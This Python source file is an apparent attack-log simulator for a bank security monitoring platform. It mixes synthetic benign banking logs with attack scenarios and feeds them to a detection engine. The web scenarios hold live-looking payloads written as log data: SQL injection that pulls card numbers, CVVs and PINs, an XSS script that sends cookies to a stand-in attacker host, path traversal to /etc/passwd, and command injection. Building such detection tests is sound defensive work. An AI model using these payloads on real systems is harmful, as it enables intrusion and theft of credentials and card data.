import random
from datetime import datetime, timedelta
from typing import List, Dict, Any
from sqlalchemy.orm import Session
from backend.models import LogEntry
from backend.engine.log_parser import LogParser
from backend.engine.detector import DetectionEngine


class BankAttackSimulator:
    """
    Realistic Cyber Attack and Banking Transaction Simulator for MR.X BANK SOC SENTINEL.
    Generates synthetic high-fidelity attacks, normal customer operations, and multi-stage APT campaigns.
    """

    BENIGN_USERS = [
        "john.doe", "sarah.connor", "alice.smith", "bob.wilson",
        "emma.watson", "david.miller", "clara.oswald", "james.holden"
    ]

    BENIGN_IPS = [
        "192.168.1.105", "192.168.1.112", "10.0.4.55", "10.0.4.89",
        "72.14.201.33", "98.138.219.231", "151.101.1.69"
    ]

    ACCOUNTS = [
        "ACC-100293", "ACC-491029", "ACC-772104", "ACC-882910",
        "ACC-330192", "ACC-994012", "ACC-551920"
    ]

    @classmethod
    def generate_benign_traffic(cls, count: int = 20) -> List[Dict[str, Any]]:
        """Generates regular everyday online banking and retail transaction logs."""
        logs = []
        now = datetime.utcnow()

        for _ in range(count):
            t_offset = random.randint(10, 1800)
            ts = now - timedelta(seconds=t_offset)
            event_type = random.choice(["auth", "web", "transaction"])

            if event_type == "auth":
                user = random.choice(cls.BENIGN_USERS)
                ip = random.choice(cls.BENIGN_IPS)
                logs.append({
                    "log_type": "auth",
                    "timestamp": ts.isoformat(),
                    "source_ip": ip,
                    "username": user,
                    "action": "login_success",
                    "endpoint": "/auth/v2/login",
                    "status_code": 200,
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"
                })
            elif event_type == "web":
                ip = random.choice(cls.BENIGN_IPS)
                endpoint = random.choice([
                    "/dashboard/accounts", "/api/v1/statement/pdf",
                    "/customer/profile", "/transfers/domestic", "/cards/view"
                ])
                logs.append({
                    "log_type": "web",
                    "timestamp": ts.isoformat(),
                    "source_ip": ip,
                    "username": random.choice(cls.BENIGN_USERS),
                    "action": "http_request",
                    "endpoint": endpoint,
                    "http_method": "GET",
                    "status_code": 200,
                    "payload": "",
                    "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
                })
            else:
                amt = round(random.uniform(15.0, 1250.0), 2)
                src = random.choice(cls.ACCOUNTS)
                dst = random.choice([a for a in cls.ACCOUNTS if a != src])
                logs.append({
                    "log_type": "transaction",
                    "timestamp": ts.isoformat(),
                    "source_ip": random.choice(cls.BENIGN_IPS),
                    "username": random.choice(cls.BENIGN_USERS),
                    "action": "funds_transfer",
                    "amount": amt,
                    "currency": "USD",
                    "source_account": src,
                    "destination_account": dst,
                    "transaction_type": random.choice(["p2p_transfer", "bill_pay", "merchant_purchase"])
                })

        return logs

    @classmethod
    def simulate_attack_scenario(cls, scenario: str) -> List[Dict[str, Any]]:
        """Generates realistic attack-specific log sequences."""
        now = datetime.utcnow()
        logs = []

        if scenario == "brute_force":
            # 7 rapid failed logins against victim 'clara.oswald' from Tor Exit IP
            attacker_ip = "185.220.101.5"
            victim = "clara.oswald"
            for i in range(7):
                ts = now - timedelta(seconds=180 - (i * 20))
                logs.append({
                    "log_type": "auth",
                    "timestamp": ts.isoformat(),
                    "source_ip": attacker_ip,
                    "username": victim,
                    "action": "login_failed",
                    "endpoint": "/api/v1/auth/login",
                    "status_code": 401,
                    "payload": f'{{"user": "{victim}", "password_attempt": "Spring2026_{i}"}}',
                    "user_agent": "Python-requests/2.31.0 Hydra/9.5"
                })

        elif scenario == "credential_stuffing":
            # 6 failed logins across 6 different customer accounts from single bot IP
            attacker_ip = "91.240.118.232"
            targets = ["alice.smith", "bob.wilson", "david.miller", "emma.watson", "john.doe", "clara.oswald"]
            for i, target in enumerate(targets):
                ts = now - timedelta(seconds=150 - (i * 22))
                logs.append({
                    "log_type": "auth",
                    "timestamp": ts.isoformat(),
                    "source_ip": attacker_ip,
                    "username": target,
                    "action": "login_failed",
                    "endpoint": "/customer/authenticate",
                    "status_code": 401,
                    "payload": f'{{"username": "{target}", "client_credential": "***hash***"}}',
                    "user_agent": "SentryMBA/1.4.1 (Windows NT 6.1; Win64)"
                })

        elif scenario == "account_takeover":
            # 4 failed logins followed by successful login from attacker IP, then high transfer
            attacker_ip = "194.26.29.112"
            victim = "sarah.connor"
            for i in range(4):
                ts = now - timedelta(minutes=10 - i)
                logs.append({
                    "log_type": "auth",
                    "timestamp": ts.isoformat(),
                    "source_ip": attacker_ip,
                    "username": victim,
                    "action": "login_failed",
                    "endpoint": "/api/v1/auth/login",
                    "status_code": 401,
                    "user_agent": "Mozilla/5.0"
                })
            # Successful breach
            success_ts = now - timedelta(minutes=5)
            logs.append({
                "log_type": "auth",
                "timestamp": success_ts.isoformat(),
                "source_ip": attacker_ip,
                "username": victim,
                "action": "login_success",
                "endpoint": "/api/v1/auth/login",
                "status_code": 200,
                "user_agent": "Mozilla/5.0"
            })

        elif scenario == "sql_injection":
            attacker_ip = "103.145.13.44"
            sqli_payloads = [
                "/api/v1/accounts?filter=ACC' UNION SELECT credit_card_num, cvv, pin FROM bank_cards--",
                "/customer/statements?year=2026' OR '1'='1'--",
                "/api/v1/transfer/verify?ref=TX-99' AND SLEEP(5)--"
            ]
            for i, payload in enumerate(sqli_payloads):
                ts = now - timedelta(seconds=90 - (i * 25))
                logs.append({
                    "log_type": "web",
                    "timestamp": ts.isoformat(),
                    "source_ip": attacker_ip,
                    "endpoint": payload,
                    "http_method": "GET",
                    "status_code": 500,
                    "payload": payload,
                    "user_agent": "sqlmap/1.7#stable"
                })

        elif scenario == "web_exploit_chain":
            # XSS, Path Traversal, and Command Injection in quick sequence
            attacker_ip = "45.154.255.88"
            logs.append({
                "log_type": "web",
                "timestamp": (now - timedelta(seconds=120)).isoformat(),
                "source_ip": attacker_ip,
                "endpoint": "/transfers/review",
                "http_method": "POST",
                "status_code": 200,
                "payload": "<script>fetch('http://c2.evil-bank.su/cookie?c='+document.cookie)</script>",
                "user_agent": "Mozilla/5.0 Firefox/125.0"
            })
            logs.append({
                "log_type": "web",
                "timestamp": (now - timedelta(seconds=80)).isoformat(),
                "source_ip": attacker_ip,
                "endpoint": "/static/download?file=../../../../etc/passwd",
                "http_method": "GET",
                "status_code": 403,
                "payload": "../../../../etc/passwd",
                "user_agent": "curl/8.4.0"
            })
            logs.append({
                "log_type": "web",
                "timestamp": (now - timedelta(seconds=40)).isoformat(),
                "source_ip": attacker_ip,
                "endpoint": "/api/v1/reports/generate?type=pdf; whoami && id",
                "http_method": "POST",
                "status_code": 500,
                "payload": "; whoami && id",
                "user_agent": "curl/8.4.0"
            })

        elif scenario == "impossible_travel":
            user = "marcus.chen"
            # 1. Login in New York at 10:00
            ts1 = now - timedelta(minutes=25)
            logs.append({
                "log_type": "auth",
                "timestamp": ts1.isoformat(),
                "source_ip": "192.168.1.100",
                "username": user,
                "action": "login_success",
                "endpoint": "/auth/login",
                "status_code": 200,
                "location_city": "New York",
                "location_country": "United States",
                "latitude": 40.7128,
                "longitude": -74.0060,
                "user_agent": "MR.X Bank Workstation (Windows 11 Enterprise)"
            })
            # 2. Login in Frankfurt 20 minutes later
            ts2 = now - timedelta(minutes=5)
            logs.append({
                "log_type": "auth",
                "timestamp": ts2.isoformat(),
                "source_ip": "185.220.101.5",
                "username": user,
                "action": "login_success",
                "endpoint": "/auth/login",
                "status_code": 200,
                "location_city": "Frankfurt",
                "location_country": "Germany",
                "latitude": 50.1109,
                "longitude": 8.6821,
                "user_agent": "TorBrowser/13.0 (Linux x86_64)"
            })

        elif scenario == "suspicious_admin_login":
            ts = now.replace(hour=3, minute=15, second=0)
            logs.append({
                "log_type": "auth",
                "timestamp": ts.isoformat(),
                "source_ip": "194.26.29.112",
                "username": "sysadmin_lead",
                "action": "login_success",
                "endpoint": "/swift-gateway/admin/console",
                "status_code": 200,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            })

        elif scenario == "aml_structuring":
            # 4 transfers just under $10,000 threshold ($9,400, $9,850, $9,200, $9,750)
            acc = "ACC-882910"
            amounts = [9400.0, 9850.0, 9200.0, 9750.0]
            for i, amt in enumerate(amounts):
                ts = now - timedelta(hours=6 - (i * 1.5))
                logs.append({
                    "log_type": "transaction",
                    "timestamp": ts.isoformat(),
                    "source_ip": "178.62.204.10",
                    "username": "vladimir.k",
                    "action": "wire_transfer",
                    "amount": amt,
                    "currency": "USD",
                    "source_account": acc,
                    "destination_account": f"OFFSHORE-PAN-{100+i}",
                    "transaction_type": "outward_wire"
                })

        elif scenario == "transaction_velocity_spike":
            # 5 wire transfers in 2 minutes
            acc = "ACC-330192"
            for i in range(5):
                ts = now - timedelta(seconds=110 - (i * 20))
                logs.append({
                    "log_type": "transaction",
                    "timestamp": ts.isoformat(),
                    "source_ip": "91.240.118.232",
                    "username": "victim.corp",
                    "action": "wire_transfer",
                    "amount": round(random.uniform(4000.0, 8500.0), 2),
                    "currency": "USD",
                    "source_account": acc,
                    "destination_account": f"MULE-ACC-{500+i}",
                    "transaction_type": "crypto_cashout_wire"
                })

        elif scenario == "large_wire_fraud":
            logs.append({
                "log_type": "transaction",
                "timestamp": (now - timedelta(minutes=8)).isoformat(),
                "source_ip": "45.154.255.88",
                "username": "treasury.manager",
                "action": "interbank_wire",
                "amount": 250000.00,
                "currency": "USD",
                "source_account": "ACC-994012",
                "destination_account": "SWIFT-CH-ZURICH-9921",
                "transaction_type": "swift_mt103_wire"
            })

        return logs

    @classmethod
    def run_simulation(cls, scenario: str, db: Session) -> Dict[str, Any]:
        """
        Executes a simulation scenario: parses logs, writes to database,
        runs detection engine, and returns summary metrics.
        """
        if scenario == "benign_flow":
            raw_logs = cls.generate_benign_traffic(25)
        else:
            # Mix benign background noise with targeted attack scenario
            benign = cls.generate_benign_traffic(5)
            attack = cls.simulate_attack_scenario(scenario)
            raw_logs = benign + attack

        normalized_logs = [LogParser.normalize_event(r) for r in raw_logs]
        
        db_entries = []
        for n in normalized_logs:
            entry = LogEntry(**n)
            db.add(entry)
            db_entries.append(entry)
        db.commit()

        for e in db_entries:
            db.refresh(e)

        # Run detection engine
        engine = DetectionEngine(db)
        alerts = engine.process_new_logs(db_entries)

        return {
            "scenario": scenario,
            "logs_ingested": len(db_entries),
            "alerts_generated": len(alerts),
            "alert_uuids": [a.alert_uuid for a in alerts],
            "severities": [a.severity for a in alerts]
        }

